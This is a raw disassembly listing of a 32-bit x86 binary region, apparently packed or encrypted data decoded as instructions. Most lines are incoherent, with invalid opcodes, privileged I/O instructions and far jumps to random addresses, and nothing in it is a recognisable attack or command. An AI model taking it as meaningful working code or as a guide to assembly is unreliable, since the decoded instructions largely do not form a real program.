  40dddf:	fstp   TBYTE PTR [ebp+0x58e755a5]
  40dde5:	scas   eax,DWORD PTR es:[edi]
  40dde6:	cmp    dl,cl
  40dde8:	popa   
  40dde9:	sub    al,0x63
  40ddeb:	push   ebp
  40ddec:	mov    ds:0x7eaa16cc,eax
  40ddf1:	sbb    eax,edi
  40ddf3:	pop    edx
  40ddf4:	xchg   BYTE PTR [edx-0x2e431fa],cl
  40ddfa:	cdq    
  40ddfb:	and    al,0x32
  40ddfd:	jae    0x40dde7
  40ddff:	and    al,0xa4
  40de01:	daa    
  40de02:	mov    ch,0xc3
  40de04:	retf   
  40de05:	inc    ebp
  40de06:	mov    gs,WORD PTR [ecx-0x42]
  40de09:	mov    edx,0x6fb99255
  40de0e:	push   edx
  40de0f:	mov    bh,0x6a
  40de11:	or     bl,BYTE PTR [ecx+0x6a]
  40de14:	add    al,0x5b
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xc8d6ed8d
  40de2d:	mov    BYTE PTR [bp+0x7e7e],0x3f
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de10
  40de37:	loop   0x40ddea
  40de39:	cli    
  40de3a:	out    dx,al
  40de3b:	mov    ecx,DWORD PTR [ebx+0x1657fde2]
  40de41:	inc    ebp
  40de42:	sub    al,0xd9
  40de44:	lods   eax,DWORD PTR ds:[esi]
  40de45:	add    ch,bh
  40de47:	push   es
  40de48:	xlat   BYTE PTR ds:[ebx]
  40de49:	inc    esp
  40de4a:	imul   eax,DWORD PTR [edx],0x65
  40de4d:	pushf  
  40de4e:	test   BYTE PTR [ecx],ah
  40de50:	push   esi
  40de51:	xchg   ebx,eax
  40de52:	add    BYTE PTR [edx],cl
  40de54:	jbe    0x40de83
  40de56:	sbb    eax,0xafaf9a38
  40de5b:	and    ecx,DWORD PTR [edx+edi*4+0x2a880b52]
  40de62:	adc    DWORD PTR [esi-0x43],0x21a5c4c2
  40de69:	adc    al,0xf6
  40de6b:	adc    DWORD PTR [ebp+0x4c3171e7],ecx
  40de71:	mov    ebp,0xd620ccdc
  40de76:	mov    ch,0x99
  40de78:	pop    edx
  40de79:	cld    
  40de7a:	dec    esi
  40de7b:	out    dx,al
  40de7c:	adc    eax,DWORD PTR [ecx]
  40de7e:	xchg   edx,eax
  40de7f:	cmc    
  40de80:	iret   
  40de81:	jecxz  0x40ded8
  40de83:	dec    edx
  40de84:	mov    al,BYTE PTR [edx]
  40de86:	add    BYTE PTR [eax-0x4034476a],0x92
  40de8d:	cmp    DWORD PTR [edx+0x7d],edi
  40de90:	hlt    
  40de91:	mov    ds:0xffe02662,al
  40de96:	inc    esp
  40de97:	cli    
  40de98:	jmp    0x2ffcc3bb
  40de9d:	sbb    eax,0xb99d9d7b
  40dea2:	pop    eax
  40dea3:	lock int3 
  40dea5:	sub    al,0x38
  40dea7:	aam    0x9f
  40dea9:	mov    edi,fs
  40deab:	jmp    0xb1c:0x75a0eb58
  40deb2:	cs lock mov bh,0x51
  40deb6:	push   esp
  40deb7:	add    edi,DWORD PTR [eax-0x492d94b1]
  40debd:	gs mov ch,0xd7
  40dec0:	test   eax,0x2b0574f5
  40dec5:	pop    esp
  40dec6:	in     eax,dx
  40dec7:	popa   
  40dec8:	(bad)  
  40dec9:	jbe    0x40df35
  40decb:	adc    DWORD PTR [edi-0x71],edi
  40dece:	jo     0x40defb
  40ded0:	cmp    BYTE PTR [edx],0xe6
  40ded3:	or     ch,BYTE PTR [eax]
  40ded5:	jge    0x40df3e
  40ded7:	fadd   st(2),st
  40ded9:	dec    eax
  40deda:	ss aas 
  40dedc:	xchg   ebp,eax
  40dedd:	popa   
  40dede:	test   al,0xda
  40dee0:	in     eax,0xf9
  40dee2:	lods   al,BYTE PTR ds:[esi]
  40dee3:	in     al,dx
  40dee4:	or     BYTE PTR [ebp+0x3f14a487],dh
  40deea:	inc    edx
  40deeb:	inc    edx
  40deec:	sub    esp,ebx
  40deee:	loopne 0x40debd
  40def0:	push   esi
  40def1:	push   es
  40def2:	add    dh,ah
  40def4:	sub    DWORD PTR [edx+0xfd8b86a],ecx
  40defa:	adc    eax,0x4fedf626
  40deff:	jb     0x40dec1
  40df01:	loope  0x40ded4
  40df03:	sbb    DWORD PTR [ebx+0x45c64fb7],ebx
  40df09:	push   0xd88cee0e
  40df0e:	sub    ch,BYTE PTR [edx+0x3e]
  40df11:	in     al,0x3a
  40df13:	sub    esp,DWORD PTR [edi+0x3f]
  40df16:	xor    DWORD PTR ds:0xe9fd0d1,edi
  40df1c:	out    dx,al
  40df1d:	icebp  
  40df1e:	fs in  al,0xea
  40df21:	outs   dx,BYTE PTR ds:[esi]
  40df22:	clc    
  40df23:	ja     0x40df1d
  40df25:	xchg   ebp,eax
  40df26:	inc    ebp
  40df27:	sbb    edx,DWORD PTR ds:0x6eaf7eb5
  40df2d:	idiv   DWORD PTR [eax]
  40df2f:	pop    edx
  40df30:	xchg   ebp,eax
  40df31:	add    al,0xa8
  40df33:	ret    
  40df34:	push   es
  40df35:	lahf   
  40df36:	or     al,0xc9
  40df38:	int3   
  40df39:	cli    
  40df3a:	or     DWORD PTR [edx],ebp
  40df3c:	repz or DWORD PTR [esp+edx*8-0x12],edi
  40df41:	lock clc 
  40df43:	jb     0x40defe
  40df45:	bound  edi,QWORD PTR [esi]
  40df47:	inc    esp
  40df48:	and    BYTE PTR [ebx-0x3f],dl
  40df4b:	sbb    dh,BYTE PTR [eax+0x39dd0cb1]
  40df51:	cmp    eax,DWORD PTR [ebp+0x1e]
  40df54:	inc    edx
  40df55:	aas    
  40df56:	(bad)  
  40df57:	xchg   ebx,eax
  40df58:	leave  
  40df59:	stc    
  40df5a:	fcmovnu st,st(3)
  40df5c:	xchg   esp,eax
  40df5d:	bound  ebp,QWORD PTR [eax+0x57]
  40df60:	loopne 0x40df10
  40df62:	xor    ebx,edx
  40df64:	outs   dx,DWORD PTR ds:[esi]
  40df65:	retf   
  40df66:	pop    ecx
  40df67:	bound  eax,QWORD PTR [esi-0x2fa1876c]
  40df6d:	sub    al,0x92
  40df6f:	out    0xe4,eax
  40df71:	xor    dl,BYTE PTR [esi-0x37976d81]
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shl    esi,1
  40dfa8:	dec    ebx
  40dfa9:	test   BYTE PTR [edi+eax*4],dh
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40dfa5
  40dfb4:	xor    eax,0xd234cbad
  40dfb9:	cmp    DWORD PTR [eax-0x88fbadf],edi
  40dfbf:	cs data16 fcmovbe st,st(3)
  40dfc3:	push   esp
  40dfc4:	dec    eax
  40dfc5:	push   edi
  40dfc6:	cli    
  40dfc7:	out    0x37,al
  40dfc9:	cmp    DWORD PTR [ebp+0x46],0xa
  40dfcd:	inc    ecx
  40dfce:	call   0x2191:0xf4949952
  40dfd5:	pop    ebp
  40dfd6:	inc    DWORD PTR [edx-0x301f19b8]
  40dfdc:	dec    ebx
  40dfdd:	aam    0x14
  40dfdf:	loop   0x40dfcc
  40dfe1:	scas   al,BYTE PTR es:[edi]
  40dfe2:	jo     0x40df9c
  40dfe4:	xor    BYTE PTR [ebx+eiz*1-0x47a081c7],ah
  40dfeb:	out    dx,eax
  40dfec:	fld    QWORD PTR [ecx-0x32]
  40dfef:	push   es
  40dff0:	(bad)  
  40dff2:	xlat   BYTE PTR ds:[ebx]
  40dff3:	fsub   st,st(2)
  40dff5:	and    dh,BYTE PTR [ecx-0x49]
  40dff8:	mov    edx,0xe2b37f28
  40dffd:	xchg   edx,eax
  40dffe:	int    0xbf
  40e000:	xor    al,0xd1
  40e002:	xchg   edi,eax
  40e003:	xor    ah,al
  40e005:	xor    edi,edx
  40e007:	std    
  40e008:	arpl   WORD PTR [ecx],bx
  40e00a:	jge    0x40e064
  40e00c:	adc    ebx,ecx
  40e00e:	push   0xffffff99
  40e010:	retf   
  40e011:	pop    eax
  40e012:	out    dx,al
  40e013:	enter  0x6e02,0xd2
  40e017:	(bad)  
  40e018:	or     esi,DWORD PTR [ecx-0x47]
  40e01b:	in     eax,dx
  40e01c:	jmp    0x3c28b128
  40e021:	adc    al,0x0
  40e023:	je     0x40e03d
  40e025:	lods   al,BYTE PTR ds:[esi]
  40e026:	jo     0x40dfe0
  40e028:	cmp    bl,bh
  40e02a:	daa    
  40e02b:	mov    dl,0xfa
  40e02d:	add    eax,0xdd44c121
  40e032:	outs   dx,BYTE PTR ds:[esi]
  40e033:	mov    edx,0x7670b9f6
  40e038:	sub    al,0xba
  40e03a:	dec    eax
  40e03b:	iret   
  40e03c:	add    al,0xc8
  40e03e:	lahf   
  40e03f:	das    
  40e040:	cs adc al,0x7d
  40e043:	push   es
  40e044:	test   DWORD PTR [ecx+0x6d3d9718],0x7f6246d3
  40e04e:	xlat   BYTE PTR ds:[ebx]
  40e04f:	xchg   edi,eax
  40e050:	fucomp st(2)
  40e052:	and    al,0x69
  40e054:	aam    0x1d
  40e056:	je     0x40e079
  40e058:	or     ch,BYTE PTR [edx]
  40e05a:	mov    ecx,0x98122ffe
  40e05f:	add    ecx,DWORD PTR [edx]
  40e061:	add    DWORD PTR [edi],ecx
  40e063:	adc    eax,0xc7a694de
  40e068:	inc    edx
  40e069:	add    ecx,ebp
  40e06b:	rcl    BYTE PTR [eax+0x601471bb],cl
  40e071:	jle    0x40e04d
  40e073:	dec    edx
  40e074:	sub    bh,BYTE PTR [edi]
  40e076:	inc    ebp
  40e077:	sbb    ebx,DWORD PTR [edx-0x40]
  40e07a:	ja     0x40e089
  40e07c:	in     eax,dx
  40e07d:	mov    ds:0xd9f20d9,al
  40e082:	jnp    0x40e0d7
  40e084:	pop    ss
  40e085:	scas   al,BYTE PTR es:[edi]
  40e086:	jno    0x40e0bf
  40e088:	sbb    bl,BYTE PTR [esi]
  40e08a:	mov    ecx,0x6bfb52a1
  40e08f:	or     ebx,esi
  40e091:	add    BYTE PTR [eax-0x76e68e26],ch
  40e097:	fisubr WORD PTR [edx+0x33009a8a]
  40e09d:	xlat   BYTE PTR ds:[ebx]
  40e09e:	stc    
  40e09f:	xor    al,0x6d
  40e0a1:	jle    0x40e075
  40e0a3:	push   ebx
  40e0a4:	fsub   QWORD PTR [edi-0x5]
  40e0a7:	pop    ebx
  40e0a8:	loopne 0x40e0d3
  40e0aa:	jle    0x40e0c4
  40e0ac:	push   eax
  40e0ad:	pop    ds
  40e0ae:	mov    cl,0x64
  40e0b0:	cld    
  40e0b1:	adc    BYTE PTR [ecx+0x513f91c9],ch
  40e0b7:	(bad)  
  40e0b8:	xor    DWORD PTR [ebp+0x47],ebx
  40e0bb:	inc    esp
  40e0bc:	adc    eax,0xe2b7bef5
  40e0c1:	aad    0xb7
  40e0c3:	push   edi
  40e0c4:	sub    eax,0x382cc8b1
  40e0c9:	push   0x1a
  40e0cb:	leave  
  40e0cc:	jp     0x40e13b
  40e0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0cf:	inc    edi
  40e0d0:	shl    BYTE PTR [esi-0x57c0cf05],0x77
  40e0d7:	dec    edx
  40e0d8:	and    edi,DWORD PTR [edx+0x9]
  40e0db:	mov    al,0x73
  40e0dd:	mov    esp,0xbabb42e5
  40e0e2:	popa   
  40e0e3:	sub    al,0x4f
  40e0e5:	jnp    0x40e07e
  40e0e7:	mov    cl,0xbb
  40e0e9:	stc    
  40e0ea:	mov    cl,0x2b
  40e0ec:	scas   al,BYTE PTR es:[edi]
  40e0ed:	push   edi
  40e0ee:	call   0x90e7f604
  40e0f3:	out    0x8b,al
  40e0f5:	inc    ebp
  40e0f6:	hlt    
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
